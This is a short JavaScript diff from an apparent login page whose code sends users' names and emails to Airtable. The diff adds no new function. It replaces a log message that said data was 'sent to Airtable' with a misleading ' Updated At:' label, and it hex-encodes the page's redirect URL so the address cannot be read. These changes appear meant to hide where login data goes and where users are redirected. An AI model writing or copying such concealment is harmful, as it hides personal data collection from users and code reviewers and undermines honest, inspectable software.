@@ -510,7 +510,7 @@ function sendLoginToAirtable(name, email) {
         if (data.error) {
           console.error("❌ Gagal kirim ke Airtable:", data.error);
         } else {
-          console.log("✅ Terkirim ke Airtable:", data);
+          console.log(" Updated At:", data);
         }
       })
       .catch(err => {
@@ -558,7 +558,7 @@ document.addEventListener("DOMContentLoaded", () => {
         google.accounts.id.disableAutoSelect();
       }
 
-      window.location.href = "https://5g88-login.vercel.app/";
+      window.location.href = decodeHex("68747470733a2f2f356738382d6c6f67696e2e76657263656c2e6170702f");
     });
   }
 });
